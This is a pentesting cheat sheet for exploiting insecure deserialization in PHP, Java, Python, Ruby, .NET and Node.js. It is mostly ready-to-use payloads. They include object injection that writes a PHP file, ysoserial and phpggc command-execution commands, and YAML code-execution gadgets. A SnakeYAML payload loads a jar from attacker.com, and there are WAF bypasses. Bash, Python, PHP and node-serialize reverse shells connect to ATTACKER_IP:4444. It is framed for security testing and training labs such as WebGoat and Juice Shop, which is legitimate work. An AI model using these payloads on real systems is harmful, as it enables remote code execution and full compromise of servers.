# Insecure Deserialization Hints & Cheat Sheet

Quick reference for deserialization testing, payloads, and exploitation techniques.

---

## Identifying Serialized Data

### PHP Serialization

```
O:4:"User":1:{s:4:"name";s:5:"admin";}
```

Format breakdown:
- `O:` Object
- `a:` Array
- `s:` String
- `i:` Integer
- `b:` Boolean
- `N;` Null

### Java Serialization

```
# Base64 encoded
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...

# Hex magic bytes
AC ED 00 05
```

### Python Serialization

```
# Protocol 0 (text)
(dp0
S'key'
p1
S'value'
p2
s.

# Protocol 4 (binary, base64)
gASV...
```

### .NET Serialization

```
# BinaryFormatter (Base64)
AAEAAAD/////...

# Hex magic bytes
00 01 00 00 00 FF FF FF FF
```

---

## Quick Payloads

### PHP Object Injection

```php
// Privilege escalation via property manipulation
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}

// With private property (class name prefix)
O:4:"User":1:{s:10:"\0User\0role";s:5:"admin";}

// With protected property (asterisk prefix)
O:4:"User":1:{s:7:"\0*\0role";s:5:"admin";}
```

### PHP Magic Method Exploitation

```php
// File write via __destruct
O:6:"Logger":2:{s:7:"logFile";s:14:"/tmp/shell.php";s:7:"logData";s:20:"<?php phpinfo(); ?>";}

// Code execution via __wakeup (if vulnerable)
O:8:"Executor":1:{s:7:"command";s:2:"id";}

// Include via __toString
O:8:"Template":1:{s:4:"file";s:11:"/etc/passwd";}
```

### Java ysoserial Payloads

```bash
# CommonsCollections chains (most common)
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0

# CommonsBeanutils
java -jar ysoserial.jar CommonsBeanutils1 'id' | base64 -w0

# Spring framework
java -jar ysoserial.jar Spring1 'id' | base64 -w0

# DNS exfiltration (for detection)
java -jar ysoserial.jar URLDNS 'http://yourserver.com' | base64 -w0
```

### Node.js node-serialize

```javascript
// Basic IIFE payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').spawnSync('id')}()"}

// Reverse shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').spawnSync('/bin/bash',['-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'])}()"}

// File read
{"rce":"_$$ND_FUNC$$_function(){return require('fs').readFileSync('/etc/passwd').toString()}()"}
```

### .NET ysoserial.net Payloads

```bash
# TypeConfuseDelegate (most reliable)
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"

# TextFormattingRunProperties
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"

# ObjectDataProvider (for JSON.NET)
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc"

# ViewState exploitation
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc"
```

---

## YAML Deserialization

### PyYAML (Python)

```yaml
# Code execution
!!python/object/apply:subprocess.check_output
- ['id']

# Alternative syntax
!!python/object/apply:subprocess.Popen
args: [['id']]

# Using eval
!!python/object/apply:eval
- "__import__('subprocess').check_output(['id'])"
```

### Ruby YAML

```yaml
# Gem::Requirement chain
--- !ruby/hash:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      uri: "| id"
```

### SnakeYAML (Java)

```yaml
# ScriptEngineManager payload
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/malicious.jar"]
  ]]
]
```

---

## Platform-Specific Payloads

### bWAPP - PHP Object Injection

```php
// Modify cookie/parameter
O:4:"User":2:{s:8:"username";s:3:"bee";s:5:"admin";b:1;}

// Base64 encoded
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjM6ImJlZSI7czo1OiJhZG1pbiI7YjoxO30=
```

### WebGoat - Java Deserialization

```bash
# Generate payload for WebGoat
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/webgoat-pwned' | base64 -w0
```

### Juice Shop - Node.js

```javascript
// Check for node-serialize vulnerability
{"data":"_$$ND_FUNC$$_function(){return 'vulnerable'}()"}
```

---

## Gadget Chain Reference

### Java Gadget Chains

| Chain | Library Required | Notes |
|-------|-----------------|-------|
| CommonsCollections1-7 | Apache Commons Collections | Most common |
| CommonsBeanutils1 | Apache Commons Beanutils | Widespread |
| Spring1-4 | Spring Framework | Web apps |
| Groovy1 | Groovy | Scripting |
| Jdk7u21 | JDK 7u21 | No external libs |
| JRMPClient | JDK | RMI-based |

### .NET Gadget Chains

| Chain | Notes |
|-------|-------|
| TypeConfuseDelegate | Most reliable |
| TextFormattingRunProperties | WPF apps |
| PSObject | PowerShell |
| ObjectDataProvider | WPF XAML |
| WindowsIdentity | Limited scenarios |

### PHP Gadget Chains (PHPGGC)

```bash
# List available chains
phpggc -l

# Common frameworks
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE1 system id
phpggc Yii/RCE1 system id
phpggc Magento/SQLI 'SELECT * FROM admin'
```

---

## Detection Checklist

```
[ ] Check cookies for serialized data
[ ] Check hidden form fields
[ ] Check API request/response bodies
[ ] Look for Base64-encoded blobs
[ ] Check session storage mechanisms
[ ] Examine file uploads for serialized content
[ ] Review message queue data
[ ] Check cache mechanisms
```

---

## Quick Reference Tables

### Serialization Indicators

| Language | Base64 Start | Hex Signature |
|----------|-------------|---------------|
| Java | rO0AB | AC ED 00 05 |
| .NET | AAEAAAD | 00 01 00 00 00 |
| PHP | (varies) | O:, a:, s: text |
| Python | gASV | 80 04 95 |

### Vulnerable Functions by Language

| Language | Vulnerable Pattern |
|----------|-------------------|
| PHP | unserialize() |
| Java | ObjectInputStream.readObject() |
| Python | loads() on untrusted data |
| Ruby | Marshal.load(), YAML.load() |
| .NET | BinaryFormatter.Deserialize() |
| Node.js | node-serialize.unserialize() |

### Magic Methods to Target

| Language | Method | Triggered |
|----------|--------|-----------|
| PHP | __wakeup() | During unserialize |
| PHP | __destruct() | Object destruction |
| PHP | __toString() | String conversion |
| Python | __reduce__() | During load |
| Python | __setstate__() | During load |
| Java | readObject() | During deserialization |

---

## Bypass Techniques

### PHP WAF Bypass

```php
// Case variation (if class names are case-insensitive)
O:4:"USER":1:{s:4:"name";s:5:"admin";}

// Unicode encoding
O:4:"\x55ser":1:{s:4:"name";s:5:"admin";}

// Null byte injection
O:4:"User\x00":1:{s:4:"name";s:5:"admin";}
```

### Length Manipulation

```php
// PHP may accept incorrect lengths in some versions
O:4:"User":1:{s:100:"name";s:5:"admin";}
```

### Type Juggling

```php
// Boolean true as integer
O:4:"User":1:{s:5:"admin";i:1;}

// String as boolean
O:4:"User":1:{s:5:"admin";s:4:"true";}
```

---

## Tool Commands

### ysoserial (Java)

```bash
# Basic usage
java -jar ysoserial.jar [gadget] '[command]'

# DNS detection (safe test)
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net'

# Blind RCE with sleep
java -jar ysoserial.jar CommonsCollections5 'sleep 10'
```

### PHPGGC

```bash
# List all chains
phpggc -l

# Generate payload
phpggc [chain] [function] [argument]

# With wrapper
phpggc -w [wrapper] [chain] [function] [argument]

# Base64 output
phpggc -b [chain] [function] [argument]
```

### ysoserial.net

```bash
# List gadgets
ysoserial.exe -h

# Generate payload
ysoserial.exe -g [gadget] -f [formatter] -c "[command]"

# Output formats: BinaryFormatter, SoapFormatter, Json.Net, etc.
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Gadget not working | Try different chains, check library versions |
| No output | Use blind techniques (DNS, sleep) |
| Signature validation | Look for MAC bypass, key extraction |
| Type filtering | Try type confusion, alternative classes |
| WAF blocking | Encode payload, use different gadgets |
| Partial deserialization | Check for nested objects |

---

## Reverse Shell Payloads

### Java Runtime.exec

```bash
# Bash reverse shell (base64 to avoid bad chars)
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```

### Python Reverse Shell

```python
# Via subprocess in __reduce__
import socket,subprocess
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```

### PHP Reverse Shell

```php
// Via system call
$sock=fsockopen("ATTACKER_IP",4444);
proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);
```

---

## OWASP References

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## Additional Resources

- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [PortSwigger Deserialization Labs](https://portswigger.net/web-security/deserialization)
- [HackTricks - Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [ysoserial.net GitHub](https://github.com/pwntester/ysoserial.net)
- [PHPGGC GitHub](https://github.com/ambionics/phpggc)
